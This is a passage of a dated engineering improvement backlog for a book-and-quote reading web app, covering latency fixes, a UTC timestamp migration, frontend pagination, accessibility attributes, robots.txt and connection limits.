**Why it matters:** Trace data is observability metadata — it does not need to be durably committed after every event, only at request completion. Batching all trace writes into a single commit at the end of each handler's lifecycle reduces WAL write amplification ~8× and decreases lock contention between concurrent requests on `agent_trace_events`. The change is safe: if the request fails mid-way, the whole trace batch is lost, which is acceptable for observability data (vs. user state where durability matters). The streaming handler already has a `finally` block (around line 4688) that closes the connection — adding `trace_manager.flush(conn)` there (before `conn.close()`) captures all deferred writes.

**Complexity:** M — add `flush(conn)` method to `TraceManager` that calls `conn.commit()` once; set `auto_commit=False` parameter on the three methods (defaulting to current behavior for backward compat); add `trace_manager.flush(conn)` to the streaming handler's `finally` block (~line 4688) and the non-streaming handler's `finally` block (~line 5085). Touch: `app_server.py:2665-2706` (TraceManager class), `app_server.py:4688, 5085` (handler finally blocks).

**Files:** `app_server.py:2665-2706` (TraceManager); `app_server.py:4688` (streaming handler finally); `app_server.py:5085` (non-streaming handler finally)

---

### E54 — MCP dispatcher spawns a full asyncio.run() per tool call — adds 50-150ms overhead per agent action (M)

**What:** `MCPToolDispatcher.dispatch()` in `mcp_dispatcher.py` opens a new asyncio event loop, TCP-connects to the MCP server on port 8788, performs the MCP initialize handshake, calls the tool, then closes the connection — for every single invocation. The file's own docstring acknowledges: "实测 ~50-150ms" per call. Every `POST /api/agent/actions/{id}/execute` triggers one dispatch. A user approving 5 agent actions in sequence accumulates 250-750ms of extra latency from asyncio setup/teardown alone, even before the tool logic runs.

**Why it matters:** The MCP server runs on the same host (port 8788 = localhost). A persistent connection would reduce per-call overhead from ~100ms to <10ms. The fastest approach: a module-level singleton that creates one asyncio event loop in a background thread and routes all dispatch calls through it via `asyncio.run_coroutine_threadsafe()`, reusing the same MCP session across calls. This is a ~30 line change to `mcp_dispatcher.py` and eliminates the dominant latency source for action execution.

**Complexity:** M — create a `_MCPSession` singleton with a background event loop thread; replace the per-call `asyncio.run()` with `asyncio.run_coroutine_threadsafe(_call_tool(...), _loop).result(timeout=30)`. Handle reconnect on connection error. Touch: `mcp_dispatcher.py` (full dispatch refactor, ~60 lines); `app_server.py:28` (import unchanged).

**Files:** `mcp_dispatcher.py` (full dispatch pattern); `tests/agent/` (add a test that dispatches two consecutive calls and asserts the second is faster, or mock the MCP client).

---

### E55 — `renderQuotes()` renders all N quotes synchronously with no display cap, unlike `renderTimeline()`'s slice(0,10) (M)

**What:** `renderTimeline()` at `app.js:1289` caps the no-search view to `allSorted.slice(0, 10)`. `renderQuotes()` at `app.js:1385` renders ALL matching quotes via `quotes.map(...)` with no cap. For a user with 300 quotes, every `renderQuotes()` call — on state change, dialog close, OCR completion, tag filter change — synchronously builds 300 quote-card DOM nodes and assigns them in one `innerHTML` operation. On a mid-tier Android phone this blocks the main thread for ~30-50ms. E5 proposes debouncing the search-input trigger, which reduces call frequency; it does not reduce the per-call DOM cost. After the 200ms debounce fires, the render still processes all 300 cards.

**Why it matters:** A "first 50 + load more" pattern consistent with `renderTimeline()`'s existing behaviour caps every `renderQuotes()` to ≤50 DOM operations regardless of collection size. For the common case (user not searching, opening the quotes tab), this turns a 30ms blocking render into a 5ms one. An `IntersectionObserver` sentinel at the bottom of the list can load the next batch automatically for a seamless scroll experience on mobile.

**Complexity:** M — add `const QUOTES_PAGE_SIZE = 50` constant; in `renderQuotes()`, render `quotes.slice(0, renderedCount)` and append a "显示更多 (N 条)" button (or an invisible sentinel div for IntersectionObserver) if `quotes.length > renderedCount`; track `renderedCount` per filter state. Touch: `app.js:1353-1420` (`renderQuotes`), `styles.css` (load-more button style), no backend changes.

**Files:** `app.js:1353-1420` (`renderQuotes`); `styles.css` (minor button style); `tests/frontend/` (new test for pagination behavior)

---

### E56 — `TraceManager` timestamps use `now_iso()` (naïve local time) — inconsistent with project UTC policy (S)

**What:** `TraceManager.create_trace()` uses `now_iso()` at line 2676 for `created_at`/`updated_at`. `TraceManager.log_event()` uses `now_iso()` at line 2695. `TraceManager.update_trace()` uses `now_iso()` at line 2702. All three produce naïve local-time strings (e.g. `2026-06-08T21:00:00` on a UTC+8 server) while the rest of the codebase has migrated user-visible timestamps to `utc_now_iso()` (OPT-014, OPT-024, OPT-031). E44 already flags `save_state()`'s `updated_at`; TraceManager is a separate class that was missed in those fixes.

**Why it matters:** Trace timestamps appear in the `/debug/agent-dashboard` page (admin-visible) and in `get_trace()` detail responses. Any future analytics that joins `agent_traces.created_at` against `user_state.updated_at` (e.g., to correlate state version with the triggering chat request) would show a spurious +8h skew on a UTC+8 server. Applying the UTC policy consistently closes the door on an entire class of future timezone bugs. The fix is three one-character changes.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:2676, 2695, 2702`. No schema changes, no test changes (trace tests don't assert timestamp format). Touch: `app_server.py:2676, 2695, 2702`.

**Files:** `app_server.py:2676` (`create_trace`), `app_server.py:2695` (`log_event`), `app_server.py:2702` (`update_trace`)

---

## 2026-06-09

### E57 — `#chatInput` textarea has no `maxlength="2000"` — user hits 2000-char backend rejection without any client-side feedback (S)

**What:** `index.html:198` has `<textarea id="chatInput" rows="1" placeholder="输入你的问题或想法…">` with no `maxlength` attribute. The backend's `AgentRequestValidator.validate_chat_request()` rejects messages longer than 2000 characters with a generic error (`app_server.py:2240-2241`). E30 (from 2026-06-04) proposed adding `maxlength` to 7 dialog form inputs (`index.html:379, 380, 402, 426, 459, 470, 607`) but the chat textarea at line 198 is explicitly absent from that list and is on a completely different code path (streaming chat handler, not a form dialog). When a user pastes a long quote or types a multi-paragraph question, they discover the limit only after hitting "发送" — the 2000-char cap is nowhere visible in the UI before submission.

**Why it matters:** The chat input is the highest-frequency interaction surface in the app. An invisible hard limit that produces a post-submit error erodes trust and causes the user to lose their typed message if the input clears. Adding `maxlength="2000"` gives the browser native enforcement (keyboard input stops at the cap) and a native character counter (`<span>` via JS) can show remaining chars when the user approaches 1800+. This is a 1-attribute + ~5-line JS change.

**Complexity:** S — add `maxlength="2000"` to `index.html:198`; optionally wire a live character-counter `<span id="chatInputCounter">` that updates on `input` event in `chat.js` (lines 875–900). No backend changes.

**Files:** `index.html:198`; `chat.js:875-900` (input event handler, optional counter)

---

### E58 — `model_logs.created_at` uses `now_iso()` (naïve local time) — last observability timestamp not aligned with project UTC policy (S)

**What:** `log_model_call()` at `app_server.py:2008` uses `now_iso()` for the `created_at` column of the `model_logs` table. E56 (from 2026-06-08) identified `TraceManager.create_trace()` / `log_event()` / `update_trace()` (lines 2676, 2695, 2702) as the same gap, but `model_logs` is a separate function (`log_model_call`) in the same file that was not covered. The chain of UTC fixes so far: OPT-014 (OCR quote createdAt), OPT-024 (ActionExecutor state JSON), OPT-031 (MCP server), E56/TraceManager (triaged but not yet in backlog). `model_logs.created_at` is the fourth remaining naive-time site in the observability pipeline.

**Why it matters:** The admin debug dashboard at `/debug/logs` orders rows by `model_logs.created_at DESC`. On a single UTC+8 server this is self-consistent (all rows are naive UTC+8), but if the server timezone changes (Docker container rebuild, cloud region migration) the timestamps become incomparable with each other and with future rows written after the change. The `/api/account/export` also includes `modelLogs` with these naive timestamps. Fixing to `utc_now_iso()` at line 2008 costs one identifier substitution and eliminates the last naive timestamp in the LLM call pipeline.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:2008`. No schema changes, no test changes. Touch: `app_server.py:2008`.

**Files:** `app_server.py:1992-2017` (`log_model_call`)

---

### E59 — `buildRenderCache()` builds metrics/quote/connection Maps but omits `bookById` — `renderQuotes()` search path calls O(n) `Array.find()` per quote (S)

**What:** `buildRenderCache()` at `app.js:617-638` pre-computes four Maps (`metricsMap`, `quoteCountMap`, `connCountMap`, `firstQuoteImageMap`) for `renderBooks()`. However, it does not build a `bookById: new Map(state.books.map(b => [b.id, b]))` lookup. `renderQuotes()` at `app.js:1367` performs `state.books.find(b => b.id === item.bookId)` inside the search-filter callback — for each of N quotes, this is O(books). With 300 quotes × 200 books during a search, that's 60,000 comparisons on every keystroke (before the debounce from E5/E14 even fires). `renderTimeline()` at line 1285 has the same pattern during search. `renderConnections()` search filter at lines 735-737 also calls both `state.books.find()` and `state.quotes.find()` per connection.

**Why it matters:** The search path is the performance-critical path: it fires on every debounced keystroke and every call to `render()` while a search is active. Precomputing `bookById` and `quoteById` Maps once (O(n+m) total, amortised over all per-item lookups) converts every inner-loop `.find()` from O(n) to O(1). For the common case of a 200-book / 500-quote user this turns a 100,000-comparison search render into a ~700-comparison one. The cache is already passed to `buildBookSearchCard()` so the wiring pattern is established.

**Complexity:** S — add `bookById: new Map(state.books.map(b => [b.id, b]))` and `quoteById: new Map(state.quotes.map(q => [q.id, q]))` to `buildRenderCache()` return value (`app.js:638`); update `renderQuotes()` and `renderTimeline()` to call `buildRenderCache()` and use `cache.bookById.get(id)` instead of `state.books.find()`. Touch: `app.js:617-638, 1282-1290, 1360-1380`.

**Files:** `app.js:617-638` (`buildRenderCache`); `app.js:1285, 1312` (`renderTimeline` loops); `app.js:1367` (`renderQuotes` search filter); `app.js:735` (`renderConnections` search filter)

---

### E60 — `ActionStateMachine.create_action()` and `transition()` use `now_iso()` for `agent_actions` table timestamps — same naïve-time gap as E56/E58 (S)

**What:** `ActionStateMachine.create_action()` at `app_server.py:2943` assigns `now = now_iso()` for the `created_at` and `updated_at` columns of the `agent_actions` table. `ActionStateMachine.transition()` at `app_server.py:2981` likewise uses `now = now_iso()` for `updated_at`, `approved_at`, and `executed_at`. OPT-024 fixed `ActionExecutor.execute_action()` — the seven calls that write user-visible `createdAt`/`updatedAt` into the **state JSON blob**. But `ActionStateMachine`, which writes the **admin-facing audit columns** of the `agent_actions` SQL table, was not part of that fix. E56 covered `TraceManager` (writing `agent_traces` + `agent_trace_events`); E58 covers `model_logs`. `agent_actions` is the third remaining table in the observability pipeline still using naive time.

**Why it matters:** The `/api/account/export` response includes all `agent_actions` rows with their timestamps (line 3748). The `/debug/agent-dashboard` page renders action data with these timestamps. Users running cross-server analytics (e.g., comparing export timestamps against `user_state.updated_at` which now uses UTC) will see a spurious +8 h skew on UTC+8 servers. The fix is identical in pattern to E56/E58: substitute `utc_now_iso()` for `now_iso()` in two functions.

**Complexity:** S — in `ActionStateMachine.create_action()` (`app_server.py:2943`) and `transition()` (`app_server.py:2981`) replace `now = now_iso()` with `now = utc_now_iso()`. Total: 2 line changes, no schema changes, no test changes. Touch: `app_server.py:2943, 2981`.

**Files:** `app_server.py:2940-2997` (`ActionStateMachine.create_action` and `transition`)

---

## 2026-06-10

### E61 — `compareBooksForList()` secondary sort still uses `localeCompare` — `renderQuotes()` was defensively fixed by OPT-014 but `renderBooks()` was not (S)

**What:** `compareBooksForList()` at `app.js:1026` sorts books within the same status bucket via `(b.createdAt || "").localeCompare(a.createdAt || "")`. OPT-014 identified this exact string-comparison pattern as bug-prone for timestamps and defensively updated `renderQuotes()` (line 1376) to use `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)`. But `compareBooksForList()` was not updated — it is still using lexicographic string comparison. Additionally, `app.js:2431` uses the same `localeCompare` pattern to find the most-recently-updated book in the agent action context picker. With all timestamps now in UTC+Z format (OPT-024/031), `localeCompare` happens to produce correct results *most of the time*, but fails when one timestamp has milliseconds ("...000Z") and another does not ("...Z"): `"2026-06-10T14:00:00Z".localeCompare("2026-06-10T14:00:00.000Z")` returns positive (wrong) because `"Z"` (ASCII 90) sorts after `"."` (ASCII 46), placing the non-millisecond timestamp incorrectly above the millisecond one at the same second.

**Why it matters:** OPT-014's comment in the fix summary explicitly states "frontend sort改为解析后比较 epoch: `new Date(b.createdAt) - new Date(a.createdAt)`，作为防御性加固" — the intent was to fix all sort sites. `compareBooksForList()` is the primary sort for the `#books` tab (every render call). Agent-created books (UTC, no milliseconds) added in the same second as user-created books (UTC, with milliseconds) can appear in the wrong order. The fix is two 1-line changes.

**Complexity:** S — in `compareBooksForList()` (`app.js:1026`) replace `(b.createdAt || "").localeCompare(a.createdAt || "")` with `(Date.parse(b.createdAt) || 0) - (Date.parse(a.createdAt) || 0)` (note reversed: descending = b - a). Similarly fix line 2431. Touch: `app.js:1026, 2431`.

**Files:** `app.js:1023-1028` (`compareBooksForList`); `app.js:2431` (most-recently-active book finder)

---

### E62 — No `robots.txt` endpoint — search engines can discover and repeatedly crawl `/api/*`, `/debug/*`, `/media/*` (S)

**What:** `app_server.py`'s `do_GET()` handler has no route for `/robots.txt`. All routes not matched by `_STATIC` or explicit path checks fall through to a 404. When search engine crawlers discover the app (via a link, a shared URL, or browser history), they will attempt to index `/api/login`, `/api/register`, `/debug/logs`, `/debug/errors`, and `/media/<uuid>/<file>`. Each such request hits the backend, triggers authentication checks or 404 processing, and leaves server-error entries in the log. For the `/api/*` endpoints this causes spurious 401 entries; for `/debug/*` it may trigger HTML rendering under admin accounts; for `/media/*` it can create unwanted cache entries in CDN/proxy layers.

**Why it matters:** Adding `robots.txt` is a one-file change that: (a) prevents crawler load on API and debug endpoints; (b) avoids `/media/` URLs from being indexed (even partially) by crawlers that ignore the CORS fix from OPT-023; (c) is expected hygiene for any commercial web app. The app already serves other static files from `_STATIC`; adding a `robots.txt` entry follows the exact same pattern.

**Complexity:** S — create `robots.txt` (~8 lines: `User-agent: *`, `Disallow: /api/`, `Disallow: /debug/`, `Disallow: /media/`, `Allow: /`, `Sitemap: …`); add `"robots.txt": ("text/plain", "robots.txt")` to the `_STATIC` dict in `do_GET()` (`app_server.py:3570-3585`). Touch: new `robots.txt` file; `app_server.py:3570-3585`.

**Files:** new `robots.txt`; `app_server.py:3570-3585` (`_STATIC` handler)

---

### E63 — `today_prefix` in debug dashboard computed with `now_iso()[:10]` — will silently miscount "today's" stats after E58 migrates `model_logs.created_at` to UTC (S)

**What:** `app_server.py:3812` computes `today_prefix = now_iso()[:10]` (a local naive date like `"2026-06-10"`) and then filters logs with `(r["createdAt"] or "").startswith(today_prefix)`. Currently `model_logs.created_at` is also written by `now_iso()` (naive local), so both values share the same timezone and the string-prefix filter works. Once E58 lands and `model_logs.created_at` is migrated to `utc_now_iso()` (UTC, e.g. `"2026-06-10T06:30:00Z"`), records created between UTC midnight and UTC+8 midnight (00:00–08:00 local, i.e. 16:00–00:00 UTC the previous day) will have a UTC date string starting with the previous calendar day — they would be excluded from "today's stats" even though they fall in the current local day. On a busy day with 240 requests, up to 80 of them (the first 8 hours' worth) would silently vanish from the dashboard's aggregate counts.

**Why it matters:** The debug dashboard's "today" token and latency aggregates guide daily operational decisions (cost monitoring, anomaly detection). A silent miscount of up to 33% of the day's traffic is a meaningful flaw. The fix is pre-emptive: change `today_prefix = now_iso()[:10]` to `today_prefix = datetime.now(timezone.utc).strftime("%Y-%m-%d")` (UTC date) so it stays consistent with UTC `createdAt` strings after E58. Alternatively, add an explicit `datetime('now', 'localtime')` SQL filter instead of Python startswith. Touch: `app_server.py:3812`.

**Complexity:** S — 1-line change: `today_prefix = now_iso()[:10]` → `today_prefix = datetime.now(timezone.utc).strftime("%Y-%m-%d")`. `datetime` and `timezone` are already imported. No schema changes, no test changes. Touch: `app_server.py:3812`.

**Files:** `app_server.py:3812-3813` (today_prefix + today_logs filter)

---

### E64 — `ocrUpdatedAt` uses `now_iso()` in `_run_quote_ocr_job()` start paths but `utc_now_iso()` at completion paths — mixed timezone on same field (S)

**What:** `_run_quote_ocr_job()` at `app_server.py:1357` and `1403` sets `quote["ocrUpdatedAt"] = now_iso()` for fast-path and Tesseract OCR intermediate status updates. The downstream completion handlers at lines `4656` and `4695` set `target_quote["ocrUpdatedAt"] = utc_now_iso()`. All four writes target the same `ocrUpdatedAt` field in the state JSON. The frontend uses `ocrUpdatedAt` at `app.js:520` via `const startedAt = Date.parse(quote.ocrUpdatedAt || ...)` to compute elapsed OCR time. `Date.parse` handles both naive-local and UTC-Z strings — but interprets them differently: a naive `"2026-06-10T22:30:00"` is parsed as UTC+8 local, while the UTC completion timestamp `"2026-06-10T14:30:00Z"` is parsed as UTC. On a UTC+8 server, these two parses produce the same epoch, so the elapsed timer displays correctly *on the same server*. However, if both start and end timestamps are present in an export and compared offline (or across servers in different timezones), the inconsistency manifests as phantom 8-hour durations.

**Why it matters:** The same UTC migration pattern was applied to every other OCR-related timestamp. Lines 1357 and 1403 were simply missed. Two one-line replacements complete the cleanup and make the entire OCR pipeline timezone-consistent.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:1357` and `1403`. No schema changes, no test changes. Touch: `app_server.py:1357, 1403`.

**Files:** `app_server.py:1317-1430` (`_run_quote_ocr_job`)

---

### E65 — `users.created_at`, `users.terms_accepted_at`, and initial `user_state.updated_at` still use `now_iso()` — final naive-time gap in the user registration and state-initialisation path (S)

**What:** The user registration handler at `app_server.py:4057-4061` writes three naive-time values: `users.created_at = now_iso()`, `users.terms_accepted_at = now_iso()`, and `user_state.updated_at = now_iso()`. `ensure_user_state()` at line 676 writes a fourth: `user_state.updated_at = now_iso()` (the INSERT-if-missing guard called at the start of every request). After OPT-030 (optimistic locking), `user_state.updated_at` is the version field returned to the client as `stateVersion`. For brand-new users, their very first `stateVersion` is a naive-local timestamp, while every subsequent save via `save_state()` writes `utc_now_iso()`. The first optimistic-lock check works because the naive string is an exact match, but mixing naive and UTC values in the same column is semantically inconsistent with the project's UTC migration policy (OPT-014/024/031/035) and the `save_state()` change already noted in E44.

**Why it matters:** Completing the UTC migration in the registration path is the clean-up step for the entire OPT-014 series. The `users.created_at` column appears in the account export and in session responses; naive timestamps there behave inconsistently relative to all other UTC timestamps in the payload. Five `now_iso()` → `utc_now_iso()` replacements at two specific lines finish the migration.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at `app_server.py:4057` (2 calls), `app_server.py:4061` (1 call), and `app_server.py:676` (1 call, `ensure_user_state`). No schema changes, no test changes. Touch: `app_server.py:676, 4057-4061`.

**Files:** `app_server.py:676` (`ensure_user_state`); `app_server.py:4057-4061` (registration handler)

---

## 2026-06-11

### E66 — `_parse_iso_to_epoch()` strips "Z" without setting UTC timezone — will silently miscalculate session and subscription expiry once any UTC+Z value is stored in those columns (S)

**What:** `_parse_iso_to_epoch()` at `app_server.py:1443-1449` is implemented as `datetime.fromisoformat(value.replace("Z", "")).timestamp()`. Stripping the `"Z"` suffix makes `fromisoformat()` produce a **timezone-naive** datetime; `.timestamp()` then converts it using the server's **local** timezone. On a UTC+8 server, the UTC string `"2026-06-11T14:00:00Z"` parses to epoch 1749614400 (14:00 UTC+8 = 06:00 UTC) instead of the correct 1749643200 (14:00 UTC). This function is used to parse `sessions.last_seen_at` (session expiry check, line 1466) and `users.plan_expires_at` (subscription check, line 1499). Currently both columns store naive-local strings (consistent), so the parsing is accidentally self-consistent. However, as the UTC migration series (OPT-014/024/031/035/038/E56/E67) progresses, the first moment either column starts receiving `utc_now_iso()` output, the expiry calculation will be silently wrong by ±TZ_OFFSET hours — sessions expire 8 hours early, Plus subscriptions appear expired while still valid, or vice versa.

**Why it matters:** The fix is a 2-line change and eliminates a landmine that will trigger the moment `sessions.last_seen_at` or `users.plan_expires_at` migrates to UTC. A silent session-expiry regression would log users out unexpectedly; a silent subscription-expiry regression would either lock out paying users or silently extend free access. The correct approach: if value ends with `"Z"`, replace with `"+00:00"` before `fromisoformat()` so the datetime is timezone-aware UTC; otherwise parse as-is.

**Complexity:** S — replace `datetime.fromisoformat(value.replace("Z", "")).timestamp()` with `datetime.fromisoformat(value if not value.endswith("Z") else value[:-1] + "+00:00").timestamp()`. No schema changes, no test changes. Touch: `app_server.py:1447`.

**Files:** `app_server.py:1443-1449` (`_parse_iso_to_epoch`); downstream callers at lines 1466 (`resolve_user_from_token`) and 1499 (`_resolve_user_plan`)

---

### E67 — `payments` table `created_at`/`updated_at` use `now_iso()` (naive local) — billing audit trail is the last un-migrated table in the UTC cleanup series (S)

**What:** The Stripe webhook handler (`app_server.py:1805-1940`) writes `now_iso()` for `payments.created_at` and `payments.updated_at` at lines ~1852, 1890, 1915, and 1935. Additionally, `period_end_iso` at line 1876 is computed via `datetime.fromtimestamp(int(period_end)).isoformat(timespec="seconds")` — converting Stripe's UTC Unix timestamp to **naive local time** before storing in `users.plan_expires_at`. The UTC migration series (OPT-014/024/031/035/038, E56, E58, E60, E63, E64, E65) has now addressed every other table in the observability and user-data pipelines. The `payments` table — a financial audit record that flows into `/api/account/export` — is the sole remaining table still using naive local timestamps.

**Why it matters:** Financial audit records should carry timezone-unambiguous timestamps. If the server migrates between data centres or is rebuilt in a different timezone, historical payment rows become incomparable with new rows. More concretely: the current `period_end_iso` stored in `plan_expires_at` is in naive local time, parsed back by `_parse_iso_to_epoch()` — both are currently self-consistent (same local TZ), but once E66's fix is applied (making `_parse_iso_to_epoch()` correct for UTC strings), this column should also migrate to UTC to remain consistent. Six `now_iso()` → `utc_now_iso()` substitutions and one `datetime.fromtimestamp(period_end)` → `datetime.fromtimestamp(period_end, tz=timezone.utc).strftime(...)` substitution complete the UTC cleanup.

**Complexity:** S — replace `now_iso()` with `utc_now_iso()` at the 4 `payments` INSERT sites (`app_server.py:~1852, ~1890, ~1915, ~1935`); change line 1876 from `datetime.fromtimestamp(int(period_end)).isoformat(timespec="seconds")` to `datetime.fromtimestamp(int(period_end), tz=timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")`. `timezone` is already imported. Touch: `app_server.py:1876, 1852, 1890, 1915, 1935`.

**Files:** `app_server.py:1850-1940` (Stripe webhook handler); `app_server.py:1876` (`period_end_iso` conversion)

---

### E68 — Session CRUD and Connection CRUD have no frontend JS tests — two of the four main tabs are regression-blind (M)

**What:** `tests/frontend/` contains 13 test files, but none cover the session timeline or connections tabs. The books tab has `book-duplicate.test.js`, `book-list-ordering-fix.test.js`, `book-ocr.test.js`; the quotes tab has `quote-content-display.test.js`, `ocr-stale-recovery.test.js`. The **sessions** tab (`renderTimeline()` at `app.js:1335-1480`, `addSession()`/`editSession()`/`deleteSession()` at `app.js:2290-2340`) and **connections** tab (`renderConnections()` at `app.js:720-760`, `addConnection()`/`editConnection()`/`deleteConnection()` at `app.js:3480-3530`) have zero dedicated test coverage. `renderTimeline()` is ~145 lines of DOM logic with date-grouping, status-filter, and card-link wiring that could silently regress. The connections sub-render is 40 lines with bidirectional label resolution.

**Why it matters:** Sessions are the primary daily-use feature (users log reading time after each session). Connections are the unique "thought-linking" capability that differentiates the app from a simple book tracker. Both have been touched in recent refactors (OPT-027 unified the card menu, adding new event wiring). Yet neither has a single JS test to catch regressions. Adding test files follows the exact same Node vm-sandbox pattern already established in `tests/frontend/ui-redesign.test.js` and `tests/frontend/chat-agent-approval.test.js` — no server needed, no new test framework.

**Complexity:** M — write `tests/frontend/session-crud.test.js` (render with fixture sessions, assert card count, assert delete calls syncState, assert status filter); write `tests/frontend/connection-crud.test.js` (render with fixture connections, assert bidirectional card labels, assert search filter). ~60-80 lines each. Touch: `tests/frontend/` (two new test files); `app.js:1335-1480, 2290-2340, 720-760` (no changes, test against existing code).

**Files:** `app.js:1335-1480` (`renderTimeline`); `app.js:2290-2340` (`deleteSession`); `app.js:720-760` (`renderConnections`); `tests/frontend/` (new test files)

---

### E69 — No per-user limit on concurrent `/api/chat/stream` SSE connections — many open tabs can exhaust the `ThreadingHTTPServer` thread pool (M)

**What:** `ThreadingHTTPServer` spawns one OS thread per connection; active SSE clients hold their thread alive for up to 30 seconds (the idle-abort timeout from E24/OPT). There is no per-user or global cap on concurrent open SSE connections. A user with 10 browser tabs can fire 10 simultaneous streaming chat requests (each passing the per-user rate-limit check since they are distinct requests in rapid succession before any counter increments). Each request blocks a thread waiting on `DeepSeek` streaming response (5–30 s). At 10 tabs × 30 s, that user monopolises ~10 threads for 30 seconds; at the OS default thread-stack size (~2–8 MB), 200 concurrent connections exhaust 400–1600 MB of RAM. The existing `_enforce_rate_limit()` is count-based (requests/hour) and fires at the top of the handler — it does not track in-flight connections.

**Why it matters:** For a small-VPS deployment (2-4 CPU cores, 2-4 GB RAM) with moderate concurrent users, a single abusive session (or a crash-looping client retrying every second) can absorb enough threads to cause `EAGAIN` / `ECONNREFUSED` for all other users. A simple `threading.Semaphore` global counter (`MAX_STREAM_CONNECTIONS = 20`) that each handler acquires before entering the SSE loop and releases in `finally` would cap worst-case thread consumption. The acquire could use `timeout=0` and return 503 immediately if the limit is reached.

**Complexity:** M — add `_stream_semaphore = threading.Semaphore(MAX_STREAM_CONNECTIONS)` constant (default 20, configurable via env); in the `/api/chat/stream` handler (`app_server.py:~4440`), acquire before entering the generator loop and release in `finally`. Add one integration test that fires `MAX_STREAM_CONNECTIONS + 1` concurrent requests and asserts the last gets 503. Touch: `app_server.py:4440-4688` (streaming handler); `tests/agent/` (new concurrency test).

**Files:** `app_server.py:4440-4688` (streaming chat handler); `tests/agent/` (new concurrency test)

---

## 2026-06-12

### E70 — Tab navigation `<nav>` missing `role="tablist"`, `role="tab"`, and `aria-selected` — screen readers announce 6 anonymous buttons (WCAG 4.1.2 Level A) (S)

**What:** `<nav class="mobile-tabs" id="mobileTabs">` at `index.html:679` contains 6 `<button>` elements (`data-tab="books"`, `session`, `quote`, `chat`, `connections`, `me`) that form the app's primary navigation. `activateTab()` at `app.js:1627-1633` switches them by toggling a CSS `active` class on buttons and `tab-active` on panels. No ARIA attributes are set: there is no `role="tablist"` on the nav, no `role="tab"` on the buttons, no `aria-selected` to communicate selected/deselected state, no `aria-controls` linking buttons to their panels, and no `id` on the panel `<section>` elements for that link to target. When a screen reader user focuses the nav, they hear "书单 button, 记录 button, …" — 6 unlabeled buttons with no indication that they form a tab widget or which one is currently active.

**Why it matters:** WCAG 2.1 SC 4.1.2 (Name, Role, Value — Level A) requires interactive components to expose their role and current state to assistive technology. The ARIA tab pattern — `role="tablist"` on the container, `role="tab"` + `aria-selected="true/false"` on each button, `role="tabpanel"` + `aria-labelledby` on each panel — is the standard expected by screen readers for this interaction model. Without it, screen reader users cannot discover which tab is selected, cannot use the standard arrow-key navigation shortcut for tabs, and are effectively locked out of the primary app structure. The fix is ~12 HTML attribute additions and 1 JS line in `activateTab()`.

**Complexity:** S — add `role="tablist"` to `index.html:679`; add `role="tab"` + `aria-selected="true"/"false"` + `aria-controls="<panel-id>"` to each of the 6 `<button>` elements (6×3 attrs); add matching `id` attributes + `role="tabpanel"` + `aria-labelledby` to each `<section data-tab-section>` (6 panels × 3 attrs); in `activateTab()` at `app.js:1629`, add one line to update `button.setAttribute("aria-selected", String(button.dataset.tab === tabName))`. Touch: `index.html:679-704` (nav + buttons), `index.html:72-160` (panel sections), `app.js:1628-1630`.

**Files:** `index.html:679-704` (tab nav); `index.html:72-160` (panel `<section>` elements); `app.js:1627-1633` (`activateTab`)

---

### E71 — `deleteBook` confirmation warns about the cascade but not the *concrete counts* (N quotes, M sessions) (S)

> ⚠️ 前提已核正(2026-06-13,owner + 核代码):原标题与正文称「cascade not mentioned / 确定删除这本书吗？ with no mention / users lose data silently」**均不实**。`index.html:533` 已有静态警告「⚠️ 同时删除该书的所有阅读记录、摘抄和探讨历史，无法恢复。」,级联删除(`app.js:2080-2101`)也干净。真正缺的只是具体数量。本条据此降级,见下。

**What(已修正):** `deleteBook()`(`app.js:2066-2122`)级联删除该书的 quotes/sessions/chatHistories/connections,且确认框 `index.html:529-539` **已含**类别级警告(line 533)。唯一不足:`els.deleteBookMessage`(line 2072)只填 `book.title`,未给出**具体条数**。一个该书下有 30 摘抄、15 记录的用户看不到「将删除 45 条」的量级。性质:不是「静默丢数据」(类别警告已防),而是「让既有警告更具体」的低风险 UX 增强,思路同 OPT-043 但等级低得多。Touch: `app.js:2072`(填入按 bookId 统计的 quotes/sessions 数)。northstar 弱-中,不紧急。

**Why it matters:** The data loss is irreversible — there is no undo path. The cascade includes quote images stored under `/uploads/<user_id>/` (a GC job would clean orphaned files, but the state data is gone). A user who accidentally confirms a book deletion loses all their quote cards, reading sessions, and annotations for that book with no recovery path (unless they have a recent export). Showing "删除《书名》还将同时删除 N 张摘抄、M 条记录和 K 个关联" takes ~5 lines of JS and directly matches the safety precedent of OPT-043.

**Complexity:** S — in `deleteBook()` at `app.js:2069`, add: `const qCount = state.quotes.filter(q => q.bookId === bookId).length; const sCount = state.sessions.filter(s => s.bookId === bookId).length;`. If either is non-zero, append the cascade summary to the message string before showing the dialog. Touch: `app.js:2069-2073` (4 lines inserted before existing dialog show).

**Files:** `app.js:2066-2073` (`deleteBook`); `index.html:526-537` (`deleteBookDialog` — message line may need to be a full sentence rather than a bare title)

---

### E72 — Login/register forms missing `autocomplete` attributes — password managers fail to auto-fill; WCAG 1.3.5 Level AA (S)

**What:** The login form at `index.html:247-248` has `<input name="username" type="text" ...>` and `<input name="password" type="password" ...>` with no `autocomplete` attribute. The registration form at `index.html:255-257` has the same gap on `username`, `email`, and `password` inputs. The search inputs (`booksSearchInput`, `sessionSearch`, etc.) correctly carry `autocomplete="off"` — the problem is specific to the two auth forms. Without `autocomplete="current-password"` on the login password field, iOS Safari and Chrome on Android don't offer to fill from the keychain (they fall back to URL-based heuristics which often fail for same-domain SPA apps). Without `autocomplete="new-password"` on the registration password field, browsers may auto-complete an old password rather than generate and save a new one.

**Why it matters:** WCAG 2.1 SC 1.3.5 (Identify Input Purpose — Level AA) requires inputs that collect personal data to carry `autocomplete` tokens so assistive technology — including switch control and voice control — can fill them automatically. For a mobile-first Chinese reading app, iOS Face ID / WeChat keychain autofill is a key UX convenience; the absence of `autocomplete` tokens blocks it. The fix is 5 HTML attribute additions with zero JS or backend changes.

**Complexity:** S — add `autocomplete="username"` to `index.html:247` (login username) and `index.html:255` (register username); `autocomplete="current-password"` to `index.html:248` (login password); `autocomplete="email"` to `index.html:256` (register email); `autocomplete="new-password"` to `index.html:257` (register password). Touch: `index.html:247-257`.

**Files:** `index.html:247-257` (login + register form inputs)

---

